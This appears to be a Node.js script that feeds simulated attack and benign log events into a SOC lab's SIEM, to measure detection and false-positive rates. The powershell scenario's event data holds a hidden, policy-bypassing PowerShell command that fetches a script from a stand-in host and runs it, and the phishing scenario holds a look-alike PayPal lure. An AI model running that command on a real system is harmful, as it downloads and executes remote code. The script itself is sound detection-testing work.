#!/usr/bin/env node
/* eslint-disable no-console */
// Attack-traffic simulator for the SOC lab. Sends events to POST /api/ingest exactly
// as a real collector would, so you can watch alerts appear live on the dashboards.
//
// Usage:
//   node scripts/simulate.js --scenario bruteforce
//   node scripts/simulate.js --scenario all --url http://192.168.1.10:5000
//   node scripts/simulate.js --scenario malware --device Windows-Target
//   node scripts/simulate.js --scenario ddos --key siem_xxx
//
//   node scripts/simulate.js --scenario all --repeat 5      (5 labelled runs for evaluation)
//
// Scenarios: bruteforce, portscan, ddos, malware, phishing, powershell, exfil, c2, benign, heartbeat, all
// Keys default to scripts/.device-keys.json written by `npm run seed`.
//
// Every event is labelled with raw.simulation = { runId, scenario, expected } so the
// platform can measure detection rate and false-positive rate (GET /api/evaluation and
// the admin "Detection evaluation" page). expected is the attack type the rules should
// find, or null for the benign scenario. Pass --no-label to send unlabelled traffic.
const fs = require('fs');
const path = require('path');

const args = Object.fromEntries(process.argv.slice(2).reduce((acc, a, i, arr) => {
  if (a.startsWith('--')) acc.push([a.slice(2), arr[i + 1] && !arr[i + 1].startsWith('--') ? arr[i + 1] : true]);
  return acc;
}, []));

const BASE = (args.url || process.env.SIEM_URL || 'http://localhost:5000').replace(/\/$/, '');
const scenario = args.scenario || 'all';
const repeat = Math.max(1, Math.min(50, parseInt(args.repeat, 10) || 1));
const label = !args['no-label'];
const runId = args.run || `run-${new Date().toISOString().replace(/[-:T]/g, '').slice(0, 14)}-${Math.random().toString(36).slice(2, 6)}`;
let current = { scenario: null, expected: null };
const stats = { sent: 0, detections: 0, latencies: [] };

// Expected detection for each scenario (ground truth for the evaluation page).
const EXPECTED = {
  bruteforce: 'brute_force', portscan: 'port_scan', ddos: 'ddos', malware: 'malware', phishing: 'phishing',
  powershell: 'powershell', exfil: 'data_exfiltration', c2: 'ioc_reputation', benign: null,
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const rnd = (n) => Math.floor(Math.random() * n);

let savedKeys = {};
try { savedKeys = JSON.parse(fs.readFileSync(path.join(__dirname, '.device-keys.json'), 'utf8')); } catch { /* none */ }

const keyFor = (deviceName) => {
  if (args.key) return args.key;
  const k = savedKeys[args.device || deviceName];
  if (!k) {
    console.error(`No API key for "${args.device || deviceName}". Pass --key <apiKey> or run "npm run seed" first.`);
    process.exit(1);
  }
  return k;
};

const send = async (deviceName, payload) => {
  const out = label
    ? { ...payload, raw: { ...(payload.raw || {}), simulation: { runId, scenario: current.scenario, expected: current.expected } } }
    : payload;
  const res = await fetch(`${BASE}/api/ingest`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-api-key': keyFor(deviceName) },
    body: JSON.stringify(out),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(`${res.status} ${body.error || res.statusText}`);
  stats.sent += 1;
  if (body.alertLatencyMs) stats.latencies.push(body.alertLatencyMs);
  if (body.detection) {
    stats.detections += 1;
    const d = body.detection;
    console.log(`  -> ${d.severity.padEnd(8)} risk ${String(d.riskScore).padStart(3)}  ${d.mitre ? d.mitre.technique : '-'}  ${d.title}${body.incidentReference ? `  [${body.incidentReference}]` : ''}`);
  }
  return body;
};

let attacker = `203.0.113.${10 + rnd(200)}`;

const scenarios = {
  async heartbeat() {
    for (const name of Object.keys(savedKeys)) {
      const res = await fetch(`${BASE}/api/ingest/heartbeat`, { method: 'POST', headers: { 'x-api-key': savedKeys[name] } });
      console.log(`  ${name}: ${res.status}`);
    }
  },
  async bruteforce() {
    console.log(`Brute force (T1110): 8 failed RDP logons from ${attacker} against Windows-Target`);
    for (let i = 0; i < 8; i += 1) {
      await send('Windows-Target', {
        eventType: 'failed_login', severity: 'MEDIUM', sourceIP: attacker,
        username: ['administrator', 'admin', 'victim'][i % 3],
        message: 'An account failed to log on.',
        raw: { EventID: 4625, LogonType: 10, FailureReason: 'Unknown user name or bad password.', Status: '0xC000006D' },
      });
      await sleep(250);
    }
  },
  async portscan() {
    const src = `192.168.1.${100 + rnd(50)}`;
    console.log(`Port scan (T1046): ${src} probing 25 ports on pfSense`);
    const ports = [21, 22, 23, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 443, 445, 636, 993, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443];
    for (const p of ports) {
      await send('pfSense-Firewall', { eventType: 'firewall_block', sourceIP: src, destinationIP: '192.168.1.1', destinationPort: p, raw: { action: 'block', proto: 'tcp', flags: 'S', interface: 'wan' } });
    }
  },
  async ddos() {
    console.log('DDoS (T1498): pfSense reports a SYN flood at 52,000 pps');
    await send('pfSense-Firewall', { eventType: 'syn_flood', severity: 'HIGH', destinationIP: '192.168.1.1', destinationPort: 80, raw: { packetsPerSecond: 52000, uniqueSources: 2400, interface: 'wan' } });
  },
  async malware() {
    console.log('Malware (T1204): EICAR test file executed from %TEMP% on Windows-Target');
    await send('Windows-Target', {
      eventType: 'process_creation', severity: 'MEDIUM', username: 'victim',
      raw: { EventID: 4688, NewProcessName: 'C:\\Users\\victim\\AppData\\Local\\Temp\\payroll_update.exe', CommandLine: 'payroll_update.exe', hash: '44d88612fea8a8f36de82e1278abb02f', ParentProcessName: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE' },
    });
  },
  async phishing() {
    console.log('Phishing (T1566): look-alike PayPal e-mail delivered and link clicked');
    await send('Windows-Target', { eventType: 'email_received', username: 'victim', raw: { sender: 'security-alert@paypal-account-verify.example', subject: 'Urgent: verify your account', body: 'Unusual activity detected. Verify your password: http://paypal-account-verify.example/login', spf: 'fail' } });
    await send('Windows-Target', { eventType: 'url_click', username: 'victim', raw: { url: 'http://paypal-account-verify.example/login' } });
  },
  async powershell() {
    console.log('PowerShell (T1059.001): hidden, encoded download cradle');
    await send('Windows-Target', {
      eventType: 'process_creation', username: 'victim',
      raw: { EventID: 4688, NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: "powershell.exe -nop -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://update-cdn-sync.example/a.ps1')\"", ParentProcessName: 'C:\\Windows\\System32\\cmd.exe' },
    });
  },
  async exfil() {
    console.log('Exfiltration (T1041): 240 MB uploaded to a known drop host');
    await send('pfSense-Firewall', { eventType: 'firewall_pass', sourceIP: '192.168.1.40', destinationIP: '203.0.113.99', destinationPort: 443, raw: { bytesOut: 251658240, protocol: 'https' } });
  },
  async benign() {
    // Normal activity that must NOT raise detections; used to measure the false-positive rate.
    const user = `192.168.1.${60 + rnd(30)}`;
    console.log(`Benign traffic: normal logons, browsing, e-mail and a mistyped password from ${user}`);
    const events = [
      ['Windows-Target', { eventType: 'successful_login', sourceIP: user, username: 'victim', raw: { EventID: 4624, LogonType: 2 } }],
      ['Windows-Target', { eventType: 'failed_login', sourceIP: user, username: 'victim', message: 'An account failed to log on.', raw: { EventID: 4625, LogonType: 2, Status: '0xC000006A' } }],
      ['Windows-Target', { eventType: 'successful_login', sourceIP: user, username: 'victim', raw: { EventID: 4624, LogonType: 2 } }],
      ['Windows-Target', { eventType: 'process_creation', username: 'victim', raw: { EventID: 4688, NewProcessName: 'C:\\Windows\\System32\\notepad.exe', CommandLine: 'notepad.exe report.txt', ParentProcessName: 'C:\\Windows\\explorer.exe' } }],
      ['Windows-Target', { eventType: 'process_creation', username: 'victim', raw: { EventID: 4688, NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe Get-Process | Sort-Object CPU', ParentProcessName: 'C:\\Windows\\explorer.exe' } }],
      ['Windows-Target', { eventType: 'email_received', username: 'victim', raw: { sender: 'it-support@example.com', subject: 'Team meeting moved to 3pm', body: 'See the updated calendar invite.', spf: 'pass', dkim: 'pass' } }],
      ['Windows-Target', { eventType: 'url_click', username: 'victim', raw: { url: 'https://www.example.org/docs/handbook' } }],
      ['pfSense-Firewall', { eventType: 'firewall_pass', sourceIP: user, destinationIP: '93.184.215.14', destinationPort: 443, raw: { bytesOut: 48213, protocol: 'https' } }],
      ['pfSense-Firewall', { eventType: 'dns_query', sourceIP: user, raw: { query: 'www.microsoft.com' } }],
      ['pfSense-Firewall', { eventType: 'firewall_block', sourceIP: user, destinationIP: '192.168.1.1', destinationPort: 23, raw: { action: 'block', proto: 'tcp' } }],
    ];
    for (const [device, payload] of events) await send(device, payload);
  },
  async c2() {
    console.log('C2 beacon (T1071): Windows-Target contacts a known command-and-control server');
    await send('pfSense-Firewall', { eventType: 'firewall_pass', sourceIP: '192.168.1.40', destinationIP: '198.51.100.66', destinationPort: 8443, raw: { bytesOut: 1536 } });
  },
};

(async () => {
  try {
    const health = await fetch(`${BASE}/api/health`).then((r) => r.json());
    console.log(`SIEM: ${health.system} - ${health.status} (${BASE})\n`);
  } catch {
    console.error(`Cannot reach ${BASE}. Is the backend running?`);
    process.exit(1);
  }
  const list = scenario === 'all' ? ['benign', 'bruteforce', 'portscan', 'ddos', 'malware', 'phishing', 'powershell', 'exfil', 'c2', 'benign'] : [scenario];
  list.forEach((name) => {
    if (!scenarios[name]) { console.error(`Unknown scenario "${name}". Options: ${Object.keys(scenarios).join(', ')}, all`); process.exit(1); }
  });
  if (label && scenario !== 'heartbeat') console.log(`Run ID: ${runId}${repeat > 1 ? ` (${repeat} repetitions)` : ''}\n`);
  for (let r = 0; r < repeat; r += 1) {
    if (repeat > 1) console.log(`--- repetition ${r + 1} of ${repeat} ---`);
    attacker = `203.0.113.${10 + rnd(200)}`; // new source each repetition so runs are independent
    for (const name of list) {
      current = { scenario: repeat > 1 ? `${name}#${r + 1}` : name, expected: EXPECTED[name] ?? null };
      try { await scenarios[name](); } catch (e) { console.error(`  ! ${name} failed: ${e.message}`); }
      console.log('');
      await sleep(400);
    }
  }
  if (stats.sent) {
    const avg = stats.latencies.length ? Math.round(stats.latencies.reduce((a, b) => a + b, 0) / stats.latencies.length) : null;
    console.log(`Sent ${stats.sent} events, ${stats.detections} classified as attacks, ${stats.latencies.length} new alerts${avg !== null ? ` (average alert latency ${avg} ms)` : ''}.`);
    if (label) console.log(`Detection rate and false-positive rate for this run: admin dashboard > Detection evaluation, or GET /api/evaluation?runId=${runId}`);
  }
})();
